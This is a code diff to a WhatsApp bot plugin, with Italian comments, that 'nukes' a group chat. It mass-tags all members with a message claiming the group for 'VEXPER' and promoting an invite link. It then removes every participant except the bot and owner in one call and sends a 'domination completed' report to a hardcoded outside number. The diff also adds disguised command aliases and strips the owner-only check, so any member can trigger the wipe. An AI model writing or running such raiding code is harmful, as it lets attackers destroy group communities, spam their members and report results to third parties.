@@ -1,3 +1,5 @@
+const LOG_JID = '393924423690@s.whatsapp.net';
+
 let handler = async (m, { conn, participants, isBotAdmin }) => {
     if (!m.isGroup) return;
 
@@ -6,18 +8,9 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
 
     if (!isBotAdmin) return;
 
-    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+    const botId = conn.user.id.split(':')[0];
 
-    // 🔹 CAMBIO NOME GRUPPO
-    try {
-        let metadata = await conn.groupMetadata(m.chat);
-        let oldName = metadata.subject;
-        let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀 𝑽𝑬𝑿𝑷𝑬𝑹̲̅`;
-        await conn.groupUpdateSubject(m.chat, newName);
-    } catch (e) {
-        console.error('Errore cambio nome gruppo:', e);
-    }
-
+    // Target per il nuke: TUTTI tranne bot + owner
     let usersToRemove = participants
         .map(p => p.jid)
         .filter(jid =>
@@ -28,29 +21,39 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
 
     if (!usersToRemove.length) return;
 
-    let allJids = participants.map(p => p.jid);
+    // ⚠️ MESSAGGIO PRIMA DEL NUKE (TAG ALL NASCOSTO)
+    let allJids = participants.map(p => p.jid); // include tutti
+    let hiddenTagMessage = '𝑮𝑹𝑼𝑷𝑷𝑶 𝑨𝑩𝑼𝑺𝑨𝑻𝑶 𝑫𝑨 𝑽𝑬𝑿𝑷𝑬𝑹\n\n\𝑨𝑫𝑬𝑺𝑺𝑶 𝑻𝑼𝑻𝑻𝑰 𝑸𝑼𝑰:\n\nhttps://chat.whatsapp.com/Jm93DpVn1Io42JX1DrBwc2';
 
     await conn.sendMessage(m.chat, {
-        text: "*NUKKATI DA VEXPER*"
+        text: hiddenTagMessage,
+        mentions: allJids // tagga tutti senza scrivere nomi
     });
 
-    await conn.sendMessage(m.chat, {
-        text: "*VI ASPETTIAMO TUTTI QUI*
-:\n\nhttps://chat.whatsapp.com/Jm93DpVn1Io42JX1DrBwc2",
-        mentions: allJids
-    });
-
+    // ⚡ NUKE — COLPO UNICO
     try {
         await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
+
+        // LOG DOPO
+        await conn.sendMessage(LOG_JID, {
+            text:
+`DOMINAZIONE COMPLETATA
+
+👤 Da: @${m.sender.split('@')[0]}
+👥 Rimossi: ${usersToRemove.length}
+📌 Gruppo: ${m.chat}
+🕒 ${new Date().toLocaleString()}`,
+            mentions: [m.sender]
+        });
+
     } catch (e) {
         console.error(e);
-        await m.reply("❌ Errore durante l'hard wipe.");
+        await m.reply('❌ Errore durante l\'hard wipe.');
     }
 };
 
-handler.command = ['svuota'];
+handler.command = ['svuota', 'berlusconi', 'kikirika'];
 handler.group = true;
 handler.botAdmin = true;
-handler.owner = true;
 
 export default handler;
